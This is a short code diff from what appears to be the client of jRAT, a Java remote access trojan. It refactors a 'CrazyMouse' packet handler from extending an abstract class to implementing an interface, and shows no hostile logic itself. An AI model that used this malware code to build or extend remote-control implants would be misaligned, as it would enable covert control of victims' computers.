@@ -6,7 +6,7 @@ import jrat.client.utils.ScreenUtils;
 import java.awt.*;
 import java.util.Random;
 
-public class Packet46CrazyMouse extends AbstractIncomingPacket {
+public class Packet46CrazyMouse implements IncomingPacket {
 
 	@Override
 	public void read(Connection con) throws Exception {
